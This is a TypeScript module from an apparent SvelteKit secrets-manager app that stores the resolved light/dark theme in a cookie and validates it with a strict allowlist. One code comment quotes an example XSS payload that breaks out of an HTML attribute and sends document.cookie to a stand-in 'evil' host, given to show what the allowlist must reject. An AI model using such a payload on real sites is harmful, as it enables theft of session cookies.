/**
 * The colour theme, and the one thing about it the SERVER needs to know.
 *
 * ---------------------------------------------------------------------------
 * WHY THERE IS A COOKIE AT ALL
 * ---------------------------------------------------------------------------
 * `mode-watcher` owns the preference (light / dark / SYSTEM) and stores it in
 * `localStorage`, which the server cannot read. Its usual answer to the
 * resulting flash-of-light-palette is an INLINE `<script>` injected into
 * `<head>` -- and this app's CSP is `script-src 'self' 'strict-dynamic'` with
 * SvelteKit-issued nonces that SvelteKit does not expose to components, so that
 * snippet would be blocked on every page. Weakening the CSP of a secrets
 * manager to remove a flash is not a trade worth making.
 *
 * So the RESOLVED appearance -- never the preference -- is mirrored into a
 * cookie, `hooks.server.ts` reads it, and the class is on `<html>` in the first
 * byte of the response. No script, no nonce, no flash.
 *
 * `light` / `dark` and not `system`, because "system" is not an answer to the
 * only question the server is asking: which palette do I paint. The browser
 * resolves it and writes back what it resolved.
 *
 * ---------------------------------------------------------------------------
 * THIS COOKIE IS ATTACKER-CONTROLLED INPUT
 * ---------------------------------------------------------------------------
 * It is written by JavaScript, so it cannot be `HttpOnly`, so anything on the
 * machine can put anything in it -- and its value is interpolated into an
 * attribute of the `<html>` tag. `readAppearance` is therefore a strict
 * two-value allowlist and returns `null` for everything else. It must never
 * become "sanitise the string": a cookie of
 * `dark" onload="fetch('//evil/'+document.cookie)` has to be UNRECOGNISED, not
 * cleaned up.
 *
 * It carries no authority of any kind. Losing it, forging it or clearing it
 * changes which colours are painted and nothing else.
 */

/**
 * Deliberately NOT prefixed with `__Host-`.
 *
 * That prefix would forbid `Path=/` scoping games and require `Secure`, which
 * sounds strictly better until `vite dev` over plain http silently stops
 * persisting the theme. This is a display preference; the strictness belongs on
 * the session cookie Access owns, not on this one.
 */
export const THEME_COOKIE = "prick_theme";

/** A year. The preference is not interesting enough to re-ask about sooner. */
const THEME_COOKIE_MAX_AGE = 60 * 60 * 24 * 365;

/** What the server can paint. Not a preference -- "system" is already resolved. */
export type Appearance = "light" | "dark";

/**
 * The cookie value, or `null` for absent AND for anything unrecognised.
 *
 * One function, used by the writer and by `hooks.server.ts`, so the allowlist
 * cannot be enforced in one place and forgotten in the other.
 */
export function readAppearance(raw: string | undefined | null): Appearance | null {
  return raw === "light" || raw === "dark" ? raw : null;
}

/**
 * Mirror the resolved appearance into the cookie. Browser only.
 *
 * `SameSite=Lax` because there is no cross-site context in which this app is
 * loaded, and `Secure` only when the page is already https so that a
 * `vite dev` session over http still works. `Path=/` so a deep link into
 * `/p/acme/prod` is painted correctly on a cold load.
 */
export function writeAppearance(value: Appearance): void {
  const secure = location.protocol === "https:" ? "; Secure" : "";

  document.cookie =
    `${THEME_COOKIE}=${value}; Path=/; Max-Age=${String(THEME_COOKIE_MAX_AGE)}; SameSite=Lax` +
    secure;
}
